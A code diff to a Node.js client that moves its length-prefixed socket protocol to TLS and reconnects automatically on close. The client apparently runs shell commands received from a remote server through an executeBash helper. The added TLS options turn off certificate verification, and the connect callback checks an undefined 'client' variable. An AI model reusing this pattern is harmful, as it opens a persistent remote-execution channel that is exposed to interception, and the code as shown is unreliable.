@@ -1,4 +1,5 @@
 const net = require('net');
+const tls = require('tls');
 const crypto = require('crypto');
 const fs = require('fs');
 const { exec } = require('child_process');
@@ -10,58 +11,66 @@ let privateKey = undefined;
 
 let callbacks = {};
 
-const socket = new net.Socket();
-
-socket.connect(port, host);
-
-socket.on('connect', () => {
-    console.log(`Established a TCP connection with ${host}:${port}`);
-    doTest();
-});
-
-socket.on('error', e => {
-    console.log(e);
-});
-
-socket.on('close', e => {
-    console.log(e);
-    const socket = new net.Socket();
-    socket.connect(port, host);
-});
-
-let received = Buffer.from([]);
-let observePhase = true;
-let nextLength = 0;
-
-function readBytes() {
-    if (observePhase) {
-        if (received.length >= 4) {
-            console.log(received.at(0), received.at(1), received.at(2), received.at(3));
-            nextLength = received.subarray(0, 4).readIntBE(0, 4);
-            received = received.subarray(4);
-            observePhase = false;
-            readBytes();
-        }
-    } else {
-        if (received.length >= nextLength) {
-            payload = received.subarray(0, nextLength);
-            received = received.subarray(nextLength);
-            observePhase = true;
-            processPacket(payload);
-            readBytes();
-        }
-    }
-}
-
+const options = {
+    host: host,
+    port: port,
+    rejectUnauthorized: false,
+};
+    
 let pcLogs = "";
 
-socket.on('data', (data) => {
-    console.log(data.toString());
-    setTimeout(() => {
-        received = Buffer.concat([received, data]);
-        readBytes();
+function connectoToTlsServer() {
+    const socket = tls.connect(options, () => {
+        if (client.authorized) {
+            console.log('✔ TLS connection authorized');
+        } else {
+            console.log('⚠ TLS connection not authorized:', client.authorizationError);
+        }
+
+        doTest();
     });
-});
+
+    socket.on('error', e => {
+        console.log(e);
+    });
+
+    socket.on('close', e => {
+        console.log(e);
+        connectoToTlsServer();
+    });
+
+    let received = Buffer.from([]);
+    let observePhase = true;
+    let nextLength = 0;
+    
+    function readBytes() {
+        if (observePhase) {
+            if (received.length >= 4) {
+                console.log(received.at(0), received.at(1), received.at(2), received.at(3));
+                nextLength = received.subarray(0, 4).readIntBE(0, 4);
+                received = received.subarray(4);
+                observePhase = false;
+                readBytes();
+            }
+        } else {
+            if (received.length >= nextLength) {
+                payload = received.subarray(0, nextLength);
+                received = received.subarray(nextLength);
+                observePhase = true;
+                processPacket(payload);
+                readBytes();
+            }
+        }
+    }
+    
+    socket.on('data', (data) => {
+        console.log(data.toString());
+        setTimeout(() => {
+            received = Buffer.concat([received, data]);
+            readBytes();
+        });
+    });
+}
 
 function processPacket(data) {
     try {
@@ -182,6 +191,8 @@ const executeBash = async (command) => {
         });
     });
 }
+
+connectoToTlsServer();
 
 async function doTest() {
 
